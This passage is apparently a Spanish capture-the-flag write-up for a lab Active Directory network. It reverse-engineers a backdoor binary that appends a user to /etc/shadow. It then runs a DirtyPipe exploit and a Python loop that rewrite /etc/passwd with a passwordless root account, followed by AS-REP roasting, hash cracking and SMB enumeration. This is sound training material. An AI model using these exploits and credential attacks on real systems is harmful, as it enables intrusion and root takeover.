Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./backup_tool...
(No debugging symbols found in ./backup_tool)
(gdb)
```

Ahora dentro de la herramienta estableceremos `3` enpoints para que se pare el flujo del programa y extraer el valor con el que lo esta validando.

```
(gdb) break g_u
Breakpoint 1 at 0x555555555c9a
(gdb) break g_p
Breakpoint 2 at 0x555555555d04
(gdb) break g_o
Breakpoint 3 at 0x555555556321
```

Establecido estos `enpoints` vamos a ejecutar `run` para que se inicie el programa y se parara en el primer `enpoint`:

```
Starting program: /home/diseo/Desktop/aws/ingenieriaInversa/backup_tool
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Enter your credentials to continue:

Breakpoint 1, 0x0000555555555c9a in g_u ()
(gdb)
```

Aqui pondremos `finish` ya que esta parte no nos interesa y veremos esto otro:

```
(gdb) finish
Run till exit from #0  0x0000555555555c9a in g_u ()
0x0000555555555fd7 in a ()
(gdb)
```

Aqui pondremos `print (char *)$rax` para extraer el valor con el que se esta validando la funcion `g_u` (`Username`):

```
(gdb) print (char *)$rax
$2 = 0x555555562b20 "backdoor"
(gdb)
```

Con esto descubrimos que el usuario es `backdoor` y ejecutaremos `continue` para que continue con el programa, meteremos unas credenciales cualquiera llegando al segundo `enpoint` que es la funcion `g_p` (`Password`), vamos a ejecutar `finish` para que llegue a la parte de la validacion.

```
(gdb) continue
Continuing.
Username: backdoor
Password: backdoor

Breakpoint 2, 0x0000555555555d04 in g_p ()
(gdb) finish
Run till exit from #0  0x0000555555555d04 in g_p ()
0x0000555555556054 in a ()
(gdb)
```

En esta parte pondremos `print (char *)$rax` para visualizar el valor con el que se esta validando pudiendo mostrar la contraseña en texto plano.

```
(gdb) print (char *)$rax
$3 = 0x7fffffffde45 "<!8,>;<;He"
(gdb)
```

Con esto ya sabemos el usuario y contraseña:

```
Username: backdoor
Password: <!8,>;<;He
```

Ahora vamos a iniciar sesion desde el `gdb` pero antes poniendo un `enpoint` en la funcion `g_o` (`OTP`) ya que esta llega cuando las credenciales son correctas, en el primer `endpoint` pondremos `finish` para que llegue a la parte de la validacion.

```
(gdb) finish
Run till exit from #0  0x0000555555556321 in g_o ()
0x0000555555556090 in a ()
(gdb)
```

Ahora aqui pondremos `print $rax` para ver el numero con el que se va a validar:

```
(gdb) print $rax
$4 = 58084
(gdb)
```

Veremos que en este caso es `58084`, por lo que si ponemos ese numero despues de ejecutar `continue` para que siga su flujo normal, veremos lo siguiente:

```
(gdb) continue
Continuing.
OTP: 58084

Select Option:

1. Plant Backdoor
2. Read Secret
3. Restart exfiltration
4. Exit

Enter choice:
```

Vemos que nos da unas opciones a elegir, si probamos a meter toda esta informacion desde la maquina victima, veremos que el `OTP` es aleatorio no es un numero `fijo`, por lo que tendremos que investigar la funcion del `OTP` para ver como se generan los numeros.

Si ponemos `disas g_o` para ver la funcion completa podemos entender que funciona por `timestamps`, dependiendo de cuando se ejecute el programa genera un numero u otro.

> Explicacion del algoritmo OTP

1. **Llama a `time(NULL)`** (línea 126)
2. **Hace cálculos con el timestamp:**
   * `time(NULL) - 0` (líneas 138-148)
   * Divide entre 30 (0x1e) (líneas 151-159)
   * Esto da: `(timestamp) / 30`
3. **Procesa datos con XOR y SHA1:**
   * Usa constantes: `0x5c` (92) y `0x36` (54) como claves XOR
   * Datos: `0x3838373932333935...` (string en memoria)
   * Aplica función `xor` (0x5555555562d0)
   * Luego SHA1\_HASH (0x555555556283)
4. **Fórmula final:**
   * Toma bytes del hash SHA1
   * Combina en un número de 32 bits
   * Aplica módulo 1,000,000 (0xf4240)

Sabiendo esto podremos utilizar `gdb` para que el propio binario nos genere el `OTP` en el momento actual y asi ponerlo en la maquina victima.

Pero antes tendremos que sincronizar la hora con el `DC` de la maquina victima, por que si no, nos dara un `OTP` incorrecto.

```shell
sudo ntpdate -s amzcorp.local
```

Ahora si ejecutamos el `gdb` con el binario cargado y la zona horaria sincronizada de forma correcta:

```shell
export LD_LIBRARY_PATH=~/openssl1.1/usr/lib/x86_64-linux-gnu
gdb -q ./backup_tool
```

Info:

```
# Ponemos un breakpoint de la funcion OTP (g_o)
(gdb) break g_o

# Despues continuamos con el programa normal
Username: backdoor
Password: <!8,>;<;He

# Ahora ponemos "finish" para llegar a la validacion
(gdb) finish

# Imprimimos el numero generado del OTP
(gdb) print $rax
$1 = 303715 # En mi caso me genero ese numero
```

Rapidamente nos vendremos a la maquina victima y pondremos ese `OTP` generado antes de que caduque:

```shell
/usr/bin/backup_tool
```

Info:

```
Enter your credentials to continue:
Username: backdoor
Password: <!8,>;<;He
OTP: 303715

Select Option:

1. Plant Backdoor
2. Read Secret
3. Restart exfiltration
4. Exit

Enter choice:
```

Veremos que ha funcionado, por lo que vamos a darle al numero `2` a ver que vemos:

```
Enter choice: 2
Secret: AWS{r3v3r51ng_1mpl4nt5_1s_fun}


Select Option:

1. Plant Backdoor
2. Read Secret
3. Restart exfiltration
4. Exit

Enter choice:
```

Vemos que hemos obtenido la `flag`.

> Magnified (Flag)

```
AWS{r3v3r51ng_1mpl4nt5_1s_fun}
```

## Shortcut

Ahora si dentro de estas opciones le damos al numero `1` veremos lo siguiente:

```
Enter choice: 1
Initiating backdoor...
Already added to shadow

Select Option:

1. Plant Backdoor
2. Read Secret
3. Restart exfiltration
4. Exit

Enter choice:
```

Vemos que ha pasado algo en el archivo `shadow` pero no sabemos el que, por lo que vamos a volver a nuestra maquina atacante e inspeccionar mejor esa parte del codigo a ver que hace.

En la funcion `l_m` vemos el funcionamiento del menu:

```c
void l_m(void)

{
  int local_c;
  
  do {
    puts("\nSelect Option:\n");
    puts("1. Plant Backdoor");
    puts("2. Read Secret");
    puts("3. Restart exfiltration");
    puts("4. Exit\n");
    printf("Enter choice: ");
    __isoc99_scanf(&DAT_001031c9,&local_c);
    if (local_c == 4) {
      printf("\x1b[1;1H\x1b[2J");
                    /* WARNING: Subroutine does not return */
      exit(0);
    }
    if (local_c < 5) {
      if (local_c == 3) {
        s_b();
      }
      else {
        if (3 < local_c) goto LAB_00102232;
        if (local_c == 1) {
          a_b();
        }
        else {
          if (local_c != 2) goto LAB_00102232;
          r_s();
        }
      }
    }
    else {
LAB_00102232:
      puts("Invalid choice!");
    }
    if (local_c == 5) {
      return;
    }
  } while( true );
}
```

Y siguiendo este rastro en el numero `1` nos lleva a la funcion llamada `a_b` que hace esto otro:

```c
undefined8 a_b(void)

{
  int iVar1;
  char local_168 [112];
  char local_f8 [112];
  char local_88 [104];
  char *local_20;
  char *local_18;
  char *local_10;
  
  puts("Initiating backdoor...");
  local_10 = "$6$52Cz9R5yJTSpDulz";
  local_18 = (char *)g_u_p();
  local_20 = crypt(local_18,local_10);
  builtin_strncpy(local_88,"tom:",5);
  local_88[5] = '\0';
  local_88[6] = '\0';
  local_88[7] = '\0';
  local_88[8] = '\0';
  local_88[9] = '\0';
  local_88[10] = '\0';
  local_88[0xb] = '\0';
  local_88[0xc] = '\0';
  local_88[0xd] = '\0';
  local_88[0xe] = '\0';
  local_88[0xf] = '\0';
  local_88[0x10] = '\0';
  local_88[0x11] = '\0';
  local_88[0x12] = '\0';
  local_88[0x13] = '\0';
  local_88[0x14] = '\0';
  local_88[0x15] = '\0';
  local_88[0x16] = '\0';
  local_88[0x17] = '\0';
  local_88[0x18] = '\0';
  local_88[0x19] = '\0';
  local_88[0x1a] = '\0';
  local_88[0x1b] = '\0';
  local_88[0x1c] = '\0';
  local_88[0x1d] = '\0';
  local_88[0x1e] = '\0';
  local_88[0x1f] = '\0';
  local_88[0x20] = '\0';
  local_88[0x21] = '\0';
  local_88[0x22] = '\0';
  local_88[0x23] = '\0';
  local_88[0x24] = '\0';
  local_88[0x25] = '\0';
  local_88[0x26] = '\0';
  local_88[0x27] = '\0';
  local_88[0x28] = '\0';
  local_88[0x29] = '\0';
  local_88[0x2a] = '\0';
  local_88[0x2b] = '\0';
  local_88[0x2c] = '\0';
  local_88[0x2d] = '\0';
  local_88[0x2e] = '\0';
  local_88[0x2f] = '\0';
  local_88[0x30] = '\0';
  local_88[0x31] = '\0';
  local_88[0x32] = '\0';
  local_88[0x33] = '\0';
  local_88[0x34] = '\0';
  local_88[0x35] = '\0';
  local_88[0x36] = '\0';
  local_88[0x37] = '\0';
  local_88[0x38] = '\0';
  local_88[0x39] = '\0';
  local_88[0x3a] = '\0';
  local_88[0x3b] = '\0';
  local_88[0x3c] = '\0';
  local_88[0x3d] = '\0';
  local_88[0x3e] = '\0';
  local_88[0x3f] = '\0';
  local_88[0x40] = '\0';
  local_88[0x41] = '\0';
  local_88[0x42] = '\0';
  local_88[0x43] = '\0';
  local_88[0x44] = '\0';
  local_88[0x45] = '\0';
  local_88[0x46] = '\0';
  local_88[0x47] = '\0';
  local_88[0x48] = '\0';
  local_88[0x49] = '\0';
  local_88[0x4a] = '\0';
  local_88[0x4b] = '\0';
  local_88[0x4c] = '\0';
  local_88[0x4d] = '\0';
  local_88[0x4e] = '\0';
  local_88[0x4f] = '\0';
  local_88[0x50] = '\0';
  local_88[0x51] = '\0';
  local_88[0x52] = '\0';
  local_88[0x53] = '\0';
  local_88[0x54] = '\0';
  local_88[0x55] = '\0';
  local_88[0x56] = '\0';
  local_88[0x57] = '\0';
  local_88[0x58] = '\0';
  local_88[0x59] = '\0';
  local_88[0x5a] = '\0';
  local_88[0x5b] = '\0';
  local_88[0x5c] = '\0';
  local_88[0x5d] = '\0';
  local_88[0x5e] = '\0';
  local_88[0x5f] = '\0';
  local_88[0x60] = '\0';
  local_88[0x61] = '\0';
  local_88[0x62] = '\0';
  local_88[99] = '\0';
  strcat(local_88,local_20);
  builtin_strncpy(local_f8,"echo \'",7);
  local_f8[7] = '\0';
  local_f8[8] = '\0';
  local_f8[9] = '\0';
  local_f8[10] = '\0';
  local_f8[0xb] = '\0';
  local_f8[0xc] = '\0';
  local_f8[0xd] = '\0';
  local_f8[0xe] = '\0';
  local_f8[0xf] = '\0';
  local_f8[0x10] = '\0';
  local_f8[0x11] = '\0';
  local_f8[0x12] = '\0';
  local_f8[0x13] = '\0';
  local_f8[0x14] = '\0';
  local_f8[0x15] = '\0';
  local_f8[0x16] = '\0';
  local_f8[0x17] = '\0';
  local_f8[0x18] = '\0';
  local_f8[0x19] = '\0';
  local_f8[0x1a] = '\0';
  local_f8[0x1b] = '\0';
  local_f8[0x1c] = '\0';
  local_f8[0x1d] = '\0';
  local_f8[0x1e] = '\0';
  local_f8[0x1f] = '\0';
  local_f8[0x20] = '\0';
  local_f8[0x21] = '\0';
  local_f8[0x22] = '\0';
  local_f8[0x23] = '\0';
  local_f8[0x24] = '\0';
  local_f8[0x25] = '\0';
  local_f8[0x26] = '\0';
  local_f8[0x27] = '\0';
  local_f8[0x28] = '\0';
  local_f8[0x29] = '\0';
  local_f8[0x2a] = '\0';
  local_f8[0x2b] = '\0';
  local_f8[0x2c] = '\0';
  local_f8[0x2d] = '\0';
  local_f8[0x2e] = '\0';
  local_f8[0x2f] = '\0';
  local_f8[0x30] = '\0';
  local_f8[0x31] = '\0';
  local_f8[0x32] = '\0';
  local_f8[0x33] = '\0';
  local_f8[0x34] = '\0';
  local_f8[0x35] = '\0';
  local_f8[0x36] = '\0';
  local_f8[0x37] = '\0';
  local_f8[0x38] = '\0';
  local_f8[0x39] = '\0';
  local_f8[0x3a] = '\0';
  local_f8[0x3b] = '\0';
  local_f8[0x3c] = '\0';
  local_f8[0x3d] = '\0';
  local_f8[0x3e] = '\0';
  local_f8[0x3f] = '\0';
  local_f8[0x40] = '\0';
  local_f8[0x41] = '\0';
  local_f8[0x42] = '\0';
  local_f8[0x43] = '\0';
  local_f8[0x44] = '\0';
  local_f8[0x45] = '\0';
  local_f8[0x46] = '\0';
  local_f8[0x47] = '\0';
  local_f8[0x48] = '\0';
  local_f8[0x49] = '\0';
  local_f8[0x4a] = '\0';
  local_f8[0x4b] = '\0';
  local_f8[0x4c] = '\0';
  local_f8[0x4d] = '\0';
  local_f8[0x4e] = '\0';
  local_f8[0x4f] = '\0';
  local_f8[0x50] = '\0';
  local_f8[0x51] = '\0';
  local_f8[0x52] = '\0';
  local_f8[0x53] = '\0';
  local_f8[0x54] = '\0';
  local_f8[0x55] = '\0';
  local_f8[0x56] = '\0';
  local_f8[0x57] = '\0';
  local_f8[0x58] = '\0';
  local_f8[0x59] = '\0';
  local_f8[0x5a] = '\0';
  local_f8[0x5b] = '\0';
  local_f8[0x5c] = '\0';
  local_f8[0x5d] = '\0';
  local_f8[0x5e] = '\0';
  local_f8[0x5f] = '\0';
  local_f8[0x60] = '\0';
  local_f8[0x61] = '\0';
  local_f8[0x62] = '\0';
  local_f8[99] = '\0';
  strcat(local_f8,local_88);
  builtin_strncpy(local_168,":19027:0:99999:7:::\' >> /etc/shadow",0x24);
  local_168[0x24] = '\0';
  local_168[0x25] = '\0';
  local_168[0x26] = '\0';
  local_168[0x27] = '\0';
  local_168[0x28] = '\0';
  local_168[0x29] = '\0';
  local_168[0x2a] = '\0';
  local_168[0x2b] = '\0';
  local_168[0x2c] = '\0';
  local_168[0x2d] = '\0';
  local_168[0x2e] = '\0';
  local_168[0x2f] = '\0';
  local_168[0x30] = '\0';
  local_168[0x31] = '\0';
  local_168[0x32] = '\0';
  local_168[0x33] = '\0';
  local_168[0x34] = '\0';
  local_168[0x35] = '\0';
  local_168[0x36] = '\0';
  local_168[0x37] = '\0';
  local_168[0x38] = '\0';
  local_168[0x39] = '\0';
  local_168[0x3a] = '\0';
  local_168[0x3b] = '\0';
  local_168[0x3c] = '\0';
  local_168[0x3d] = '\0';
  local_168[0x3e] = '\0';
  local_168[0x3f] = '\0';
  local_168[0x40] = '\0';
  local_168[0x41] = '\0';
  local_168[0x42] = '\0';
  local_168[0x43] = '\0';
  local_168[0x44] = '\0';
  local_168[0x45] = '\0';
  local_168[0x46] = '\0';
  local_168[0x47] = '\0';
  local_168[0x48] = '\0';
  local_168[0x49] = '\0';
  local_168[0x4a] = '\0';
  local_168[0x4b] = '\0';
  local_168[0x4c] = '\0';
  local_168[0x4d] = '\0';
  local_168[0x4e] = '\0';
  local_168[0x4f] = '\0';
  local_168[0x50] = '\0';
  local_168[0x51] = '\0';
  local_168[0x52] = '\0';
  local_168[0x53] = '\0';
  local_168[0x54] = '\0';
  local_168[0x55] = '\0';
  local_168[0x56] = '\0';
  local_168[0x57] = '\0';
  local_168[0x58] = '\0';
  local_168[0x59] = '\0';
  local_168[0x5a] = '\0';
  local_168[0x5b] = '\0';
  local_168[0x5c] = '\0';
  local_168[0x5d] = '\0';
  local_168[0x5e] = '\0';
  local_168[0x5f] = '\0';
  local_168[0x60] = '\0';
  local_168[0x61] = '\0';
  local_168[0x62] = '\0';
  local_168[99] = '\0';
  strcat(local_f8,local_168);
  iVar1 = s_s();
  if (iVar1 == 0) {
    system(local_f8);
    puts("You may authenticate now");
  }
  else {
    puts("Already added to shadow");
  }
  return 0;
}
```

Por lo que vemos...

1. **Crea un usuario `tom`** en `/etc/shadow`
2. **El password hash** se genera desde `g_u_p()` con sal `$6$52Cz9R5yJTSpDulz`
3. **Ya está agregado** (por eso dice "Already added to shadow")

Necesitamos ver que retorna `g_u_p()` por lo que vamos a utilizar `gdb` de esta forma:

```shell
gdb -q ./backup_tool
```

Info:

```
Reading symbols from ./backup_tool...
(No debugging symbols found in ./backup_tool)
(gdb) break g_o
Breakpoint 1 at 0x2321
(gdb) break g_u_p
Breakpoint 2 at 0x1c1b
(gdb) run
Starting program: /home/diseo/Desktop/aws/ingenieriaInversa/backup_tool
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Enter your credentials to continue:
Username: backdoor
Password: <!8,>;<;He

Breakpoint 1, 0x0000555555556321 in g_o ()
(gdb) finish
Run till exit from #0  0x0000555555556321 in g_o ()
0x0000555555556090 in a ()
(gdb) print $rax
$1 = 386176
(gdb) continue
Continuing.
OTP: 386176

Select Option:

1. Plant Backdoor
2. Read Secret
3. Restart exfiltration
4. Exit

Enter choice: 1
Initiating backdoor...

Breakpoint 2, 0x0000555555555c1b in g_u_p ()
(gdb) finish
Run till exit from #0  0x0000555555555c1b in g_u_p ()
0x00005555555559d5 in a_b ()
(gdb) x/s $rax
0x55555557c740:	"dG9#r1@c0fR"
```

Por lo que vemos la contraseña de `tom` es `dG9#r1@c0fR` que es la que se asigno en el `shadow`, ahora volviendo a la maquina victima vamos a probar esta contraseña.

```shell
su tom
```

Metemos como contraseña `dG9#r1@c0fR`...

```
$ bash
tom@d77274080e09:/var/www/web$ whoami
tom
```

Vemos que ha funcionado.

### CVE-2022-0847 (DirtyPipe)

Despues de un rato buscando ejecute `linpeas.sh` pasandomelo mediante un servidor de `python3` a la maquina victima y vemos este `CVE` bastante interesante (Esta conclusion es despues de haber probado casi todo lo que reporto `linpeas.sh`):

URL = [Linpeas.sh GitHub](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)

```
[+] [CVE-2022-0847] DirtyPipe

   Details: https://dirtypipe.cm4all.com/
   Exposure: less probable
   Tags: ubuntu=(20.04|21.04),debian=11
   Download URL: https://haxx.in/files/dirtypipez.c
```

Si probamos a explotar dicha vulnerabilidad descargando los archivos de este repo:

URL = [CVE-2022-0847 PoC GitHub](https://github.com/Al1ex/CVE-2022-0847)

Primero nos copiamos el archivo `exp.c` a la maquina victima y despues lo tendremos que compilar de esta forma:

```shell
gcc exp.c -o exp
```

Seguidamente ejecutaremos el binario compilado de esta forma:

```shell
./exp /etc/passwd 1 ootz:
```

Info:

```
It worked!
```

Veremos que ha funcionado, ahora solamente haremos `sudo rootz` y veremos lo siguiente:

```
rootz@d77274080e09:/tmp# whoami
rootz
```

***

> En caso de un error por que otro usuario haya puesto un hash de contraseña.

```shell
python3 -c "
import subprocess

# Crear contenido limpio
clean_content = '''rootz::0:0:root:/root:/bin/bash
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
tom:x:1000:1000::/home/tom:/bin/sh
matthew:x:1001:1001::/home/matthew:/bin/sh
'''

# Escribir poco a poco usando el exploit
lines = clean_content.split('\\n')
offset = 1  # Empezar en offset 1 para evitar page boundary

for line in lines:
    if line:  # Si la línea no está vacía
        # Escribir línea + newline
        to_write = line + '\\n'
        print(f'Escribiendo: {line[:30]}...')
        subprocess.run(['./exp', '/etc/passwd', str(offset), to_write])
        offset += len(to_write)
        import time
        time.sleep(0.1)

print('✓ Archivo reconstruido')
"
```

Nos automatizamos este script para restaurar el `passwd` y que quede limpio.

***

Una vez que ya seamos el usuario `root` podremos leer la `flag` de la `home` de `root`.

> Shortcut (Flag)

```
AWS{uN1x1f13d_4_l0t!}
```

## Jerry-built

Anteriormente enumerando encontre un `email` que iba dirigido para el usuario `root`, el cual ahora si podemos leer.

```shell
cat /var/mail/root
```

Info:

```
From tom@localhost  Mon, 10 Jan 2022 09:10:48 GMT
Return-Path: <tom@localhost>
Received: from localhost (localhost [127.0.0.1])
	by localhost (8.15.2/8.15.2/Debian-18) with ESMTP id 28AAfaX452455
	for <root@localhost>; Mon, 10 Jan 2022 09:10:48 GMT
Received: (from tom@localhost)
	by localhost (8.15.2/8.15.2/Submit) id 28AAfaX452455;
	Mon, 10 Jan 2022 09:10:48 GMT
Date: Mon, 10 Jan 2022 09:10:48 GMT
Message-Id: <202201100910.28AAfaX452455@localhost>
To: root@localhost
From: tom@localhost
Subject: Activating User Account

Hi Tony.

Could you please activate the user account jameshauwnnel on the domain controller along withsetting correct permissions for him.

Thanks,
Tom
```

Nos cuenta que si podemos activar la cuenta de `jameshauwnnel` del `DC`, por lo que podemos deducir que este usuario pertenece al dominio del `DC01`, esto lo podemos comprobar rapidamente con `kerbrute` de esta forma:

> users.txt

```
jameshauwnnel
```

```shell
kerbrute userenum --dc <IP> -d amzcorp.local users.txt
```

Info:

```
    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 12/28/25 - Ronnie Flathers @ropnop

2025/12/28 09:24:29 >  Using KDC(s):
2025/12/28 09:24:29 >  	10.13.37.15:88

2025/12/28 09:24:29 >  [+] VALID USERNAME:	jameshauwnnel@amzcorp.local
2025/12/28 09:24:29 >  Done! Tested 1 usernames (1 valid) in 0.142 seconds
```

### ASREPRoast (jameshauwnnel)

Veremos que ha funcionado, confirmamos que si es un usuario de dominio, por lo que vamos a probar si tuviera alguna mala configuracion dentro del dominio el usurio para poder realizar un `ASREPRoast` de esta forma:

```shell
sudo ntpdate -s amzcorp.local; impacket-GetNPUsers amzcorp.local/ -no-pass -usersfile users.txt -format john -dc-ip <IP>
```

Info:

```
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

$krb5asrep$jameshauwnnel@AMZCORP.LOCAL:9bd50c30d42791f57039d1ec0847c127$6b0ff0d08c604be6c074418307b6da0b01577c6fd793074e3e21f009518ef46b7bbded88f2a7d9e225347750a700eb0256c1124bde7a4048653fc436f099bd65748a06939e041c95b001e38bc2ce23eec01d1689e2b9fb8644ee02363037634dfb5d23e52b004329b1b69fe42893af6efaf96625a31eecb8f2032ec15dbaa13a7ef7cb17c56f613e5006dcb732d7cfe549d4f116cc11ef72be53e66a8066ba3cf1f13f3f07a830377cb4f0f671895447c226fb6b9a2e10a9d524204c955dd13d02528279b007b645caf867a9cc11fc3400eab7acecc75dd144269c27a967461d88bed16eb314169c3e57aea6d037
```

Veremos que ha funcionado, vamos a guardarlo en un archivo llamado `hash` e intentaremos `crackeralo`.

> hash

```
$krb5asrep$jameshauwnnel@AMZCORP.LOCAL:9bd50c30d42791f57039d1ec0847c127$6b0ff0d08c604be6c074418307b6da0b01577c6fd793074e3e21f009518ef46b7bbded88f2a7d9e225347750a700eb0256c1124bde7a4048653fc436f099bd65748a06939e041c95b001e38bc2ce23eec01d1689e2b9fb8644ee02363037634dfb5d23e52b004329b1b69fe42893af6efaf96625a31eecb8f2032ec15dbaa13a7ef7cb17c56f613e5006dcb732d7cfe549d4f116cc11ef72be53e66a8066ba3cf1f13f3f07a830377cb4f0f671895447c226fb6b9a2e10a9d524204c955dd13d02528279b007b645caf867a9cc11fc3400eab7acecc75dd144269c27a967461d88bed16eb314169c3e57aea6d037
```

Despues de un rato con `john` si lo lanzamos normal no lo conseguira, despues de estar horas investigando y probando reglas hubo una que si funciono llamada `d3ad0ne`:

```shell
john --format=krb5asrep --wordlist=<WORDLIST> --rules=d3ad0ne hash
```

Info:

```
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
654221p!         ($krb5asrep$jameshauwnnel@AMZCORP.LOCAL)
1g 0:00:07:26 DONE (2025-12-28 10:08) 0.002241g/s 2164Kp/s 2164Kc/s 2164KC/s ! brayden042307!..maclacp!
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Veremos que hemos conseguido despues de unos minutos `crackear` el `hash`, vamos a comprobarlo con `netexec` de esta forma:

```shell
netexec smb <IP> -u jameshauwnnel -p '654221p!'
netexec ldap <IP> -u jameshauwnnel -p '654221p!'
```

Info:

```
SMB         10.13.37.15     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:amzcorp.local) (signing:True) (SMBv1:False)
SMB         10.13.37.15     445    DC01             [+] amzcorp.local\jameshauwnnel:654221p!
LDAP        10.13.37.15     389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:amzcorp.local)
LDAP        10.13.37.15     389    DC01             [+] amzcorp.local\jameshauwnnel:654221p!
```

Veremos que si funciona tanto en `SMB` como en `LDAP`, por lo que vamos a listar los recursos compartidos del servidor `SMB` con dichas credenciales:

```shell
smbclient -L //<IP>/ -U jameshauwnnel
```

Metemos como contraseña `654221p!`...

```
	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share
	Product_Release Disk
	SYSVOL          Disk      Logon server share
```

Veremos que hay un recurso que no esta por defecto llamado `Product_Release`, por lo que vamos a entrar dentro de dicho recurso.

```shell
smbclient //<IP>/Product_Release -U jameshauwnnel
```

Metemos como contraseña `654221p!`...

```
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Jan 18 04:33:38 2022
  ..                                  D        0  Tue Jan 18 04:33:38 2022
  AMZ-V1.0.11.128_10.2.112.chk        A 18770248  Thu Dec 23 04:25:12 2021
  AMZ-V1.0.11.128_10.2.112_Release_Notes.html      A      838  Thu Dec 23 05:54:59 2021

		12949247 blocks of size 4096. 1619759 blocks available
```

Si listamos veremos `2` archivos los cuales nos vamos a descargar.

```shell
get AMZ-V1.0.11.128_10.2.112.chk
get AMZ-V1.0.11.128_10.2.112_Release_Notes.html
```

Ahora si analizamos el archivo de `.chk` veremos que es un archivo `firmware` el cual podremos extraer con una herramienta la informacion y si abrimos el `.html` veremos lo siguiente:

```
Security Fixes:

    Fixes security vulnerabilities.

For more information about security vulnerabilities, visit http://amzcorp.local/about/security

Download Link: http://downloads.amzcorp.local/files/GDC/AMZv1/AMZ-V1.0.11.128_10.2.112.chk

Firmware Update Instructions:

To update your device’s firmware, follow the instructions in your device’s user manual. To view your device’s user manual, visit http://amzcorp.local/support/product/amzv1.aspx#docs.
```

Veremos que hay un parche de actualizacion que se ha corregido de algo, por lo que podremos analizar el `firmware` para poder ver que tipo de vulnerabilidad pueda tener y probar si lo han parcheado realmente o no.

> Info:

Esto es un **router/dispositivo de red de AMZCorp**:

1. **Dominio interno:** `amzcorp.local`
2. **URL de descargas:** `http://downloads.amzcorp.local`
3. **Modelo:** `AMZv1`

### Extracción de Firmware (AMZv1)

Vamos a extraer el archivo del `firmware` con `binwalk` de esta forma:

```shell
binwalk -e AMZ-V1.0.11.128_10.2.112.chk --run-as=root
```

Info:

```
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
14419         0x3853          xz compressed data
14640         0x3930          xz compressed data

WARNING: Symlink points outside of the extraction directory: /home/diseo/Desktop/aws/smb/_AMZ-V1.0.11.128_10.2.112.chk.extracted/squashfs-root/var -> /tmp; changing link target to /dev/null for security purposes.

WARNING: Symlink points outside of the extraction directory: /home/diseo/Desktop/aws/smb/_AMZ-V1.0.11.128_10.2.112.chk.extracted/squashfs-root/etc/localtime -> /tmp/localtime; changing link target to /dev/null for security purposes.

WARNING: Symlink points outside of the extraction directory: /home/diseo/Desktop/aws/smb/_AMZ-V1.0.11.128_10.2.112.chk.extracted/squashfs-root/etc/TZ -> /tmp/TZ; changing link target to /dev/null for security purposes.

WARNING: Symlink points outside of the extraction directory: /home/diseo/Desktop/aws/smb/_AMZ-V1.0.11.128_10.2.112.chk.extracted/squashfs-root/etc/mtab -> /proc/423218/mounts; changing link target to /dev/null for security purposes.

WARNING: Symlink points outside of the extraction directory: /home/diseo/Desktop/aws/smb/_AMZ-V1.0.11.128_10.2.112.chk.extracted/squashfs-root/etc/resolv.conf -> /tmp/resolv.conf; changinglink target to /dev/null for security purposes.

WARNING: Symlink points outside of the extraction directory: /home/diseo/Desktop/aws/smb/_AMZ-V1.0.11.128_10.2.112.chk.extracted/squashfs-root/etc/ppp/resolv.conf -> /tmp/resolv.conf.ppp; changing link target to /dev/null for security purposes.
538952        0x83948         Squashfs filesystem, little endian, version 4.0, compression:xz, size: 18230598 bytes, 995 inodes, blocksize: 262144 bytes, created: 2021-12-22 11:53:50

WARNING: One or more files failed to extract: either no utility was found or it's unimplemented
```

Despues de un rato investigando la carpeta extraida del `firmware` podremos ver un archivo binario de `database` que es interesante, si lo ejecutamos veremos que nos deja archivos temporales de `AWS` en el `/tmp` por lo que vamos a extraer el binario a ver que podemos ver.

```shell
git clone https://github.com/extremecoders-re/pyinstxtractor
cd pyinstxtractor/
python3 pyinstxtractor.py /<PATH>/_AMZ-V1.0.11.128_10.2.112.chk.extracted/squashfs-root/bin/database
```

Info:

```
[+] Processing /home/diseo/aws/_AMZ-V1.0.11.128_10.2.112.chk.extracted/squashfs-root/bin/database
[+] Pyinstaller version: 2.1+
[+] Python version: 3.8
[+] Length of package: 16379452 bytes
